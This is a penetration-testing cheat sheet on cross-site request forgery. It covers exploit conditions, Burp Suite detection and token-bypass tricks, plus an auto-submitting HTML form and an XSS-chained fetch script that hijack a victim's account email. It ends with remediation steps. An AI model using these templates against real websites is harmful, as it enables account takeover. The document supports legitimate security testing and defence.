# CSRF — Cross-Site Request Forgery

**CWE:** CWE-352 | **OWASP:** A01:2021

---

## Required Conditions

All three must be true for CSRF to be exploitable:
1. **No unpredictable token** (or token not validated)
2. **Cookie-based session** (no custom header required)
3. **SameSite cookie NOT set to Strict** (Lax may still be exploitable)

---

## Detection

```
Look for state-changing requests without CSRF tokens:
- POST /account/change-email
- POST /account/change-password
- POST /settings/update
- DELETE /api/user/delete
- POST /admin/user/promote

In Burp Suite:
1. Intercept a state-changing POST request
2. Right-click → Engagement Tools → Generate CSRF PoC
3. Test in browser
```

---

## Bypass Techniques

```bash
# 1. Remove the CSRF token entirely
# (server may only validate if present, not absence)
Before: csrf_token=abc123&email=new@email.com
After:  email=new@email.com

# 2. Use your own CSRF token (session-independent tokens)
# Generate token for attacker account, use on victim request

# 3. Change method POST → GET
# Some frameworks protect POST but not GET for same operation
GET /change-email?new=attacker@evil.com

# 4. Change Content-Type
# Some CSRF protection only applies to application/x-www-form-urlencoded
Content-Type: text/plain
Content-Type: application/json  (if server accepts)

# 5. Referer-based bypass
# Add Referer: https://target.com
# Or use: <meta name="referrer" content="never"> to strip Referer
```

---

## PoC HTML Template

```html
<!-- CSRF PoC — auto-submitting form -->
<html>
<body>
  <h1>CSRF PoC</h1>
  <form id="csrf-form" action="https://target.com/account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

---

## CSRF + XSS Chain

```javascript
// If you have XSS, bypass CSRF tokens by reading them from the DOM
fetch('/settings')
  .then(r => r.text())
  .then(html => {
    const token = html.match(/csrf[_-]?token.*?value="([^"]+)"/i)[1];
    return fetch('/account/change-email', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: `email=attacker@evil.com&csrf_token=${token}`
    });
  });
```

---

## Remediation

- Generate unpredictable per-session CSRF tokens
- Set `SameSite=Strict` or `SameSite=Lax` on session cookies
- Verify `Origin` and `Referer` headers on state-changing requests
- Use custom request headers for AJAX (browser's CORS will block cross-origin custom headers)
